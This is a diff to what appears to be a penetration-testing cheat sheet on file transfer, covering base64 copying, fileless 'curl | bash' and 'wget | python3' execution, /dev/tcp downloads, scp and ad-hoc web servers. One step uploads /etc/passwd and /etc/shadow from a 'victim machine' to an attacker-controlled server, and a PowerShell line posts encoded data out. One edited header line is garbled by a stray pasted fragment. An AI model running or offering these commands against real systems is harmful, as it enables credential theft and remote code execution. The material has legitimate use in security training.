@@ -1243,7 +1243,7 @@ curl -s "https://crt.sh/?q=[domain]&output=json" | jq -r '.[]
     Invoke-WebRequest -Uri http://[ip]:8000/ -Method POST -Body $b64
   
 
-# SMB Uploads - Using WebDAV (RFC 4918)
+# SMB Uploads - Using WebDAV (RFC 4918O 2. curl is the same but its -o not -O)
   SMB will first try to connect to a remote target using SMB, if that fails it will then try using HTTP. We can setup a WebDav server.
 
   1. Install python wsgidav cheroot
@@ -1267,5 +1267,90 @@ curl -s "https://crt.sh/?q=[domain]&output=json" | jq -r '.[]
 
   3. Use text file with ftp commands (As shown above) if no interactive temrinal
 ```
+<br>
+
+### Linux File Transfer Methods 
+```
+# Base64 Encode and Decode 
+  1. Encode b64
+    cat [file want to decode] | base64 -w 0; echo 
+  
+  2. Copy output, paste into receiving terminal, decode 
+    echo -n "b64 output" | base64 -d > fileName 
+
+  3. Note: Check hash of file b4 and after to ensure integrity 
 
 
+# Web Downloads (wget and curl)
+  1. wget 
+    wget https://[remote file name] -O outputFileName
+
+  2. curl is the same but its -o not -O
+
+
+# Fileless web downloads (Run in memory)
+  1. Curl 
+    curl https://[web download] | bash
+
+  2. wget 
+    wget -qO- https://[web download] | python3 
+
+
+# Download with Bash (/dev/tcp)
+  1. Connect to target webserver
+    exec 3<>/dev/tcp/[ip]/[port]
+
+  2. Get request 
+    echo -e "GET /[file] HTTP/1.1\n\n">&3 
+
+  3. Print Response 
+    cat <&3 
+
+
+# SSH downloads 
+  1. Start SSH and check if your pc is listening 
+    sudo systemctl start ssh
+    netstat -lnpt 
+
+  2. Use SCP to download file to and from 
+    scp root@[ip]:/dir/to/file.txt . 
+    scp /file/to/download.txt root@[ip]:/location/to/go/to 
+```
+
+<br>
+
+### Linux Upload Methods 
+```
+# Python uploadserver.py
+  1. Install uploadserver 
+    sudo python3 -m pip install --user uploadserver
+
+  2. Create self-signed cert
+    openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+
+  3. Make new dir
+    mkdir https && cd https
+
+  4. Start server
+    sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
+
+  5. Upload from victim machine 
+    curl -X POST https://[attacker ip]/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
+
+
+# Start up Mini webserver 
+  1. python3 
+    python3 -m http.server
+
+  2. python2.7
+    python2.7 -m SimpleHTTPServer
+
+  3. PHP
+    php -S 0.0.0.0:8000 
+
+  4. ruby 
+    ruby -run -ehttpd . -p8000 
+
+  5. From attacker machine 
+    wget [victim ip]:8000/file.txt 
+```
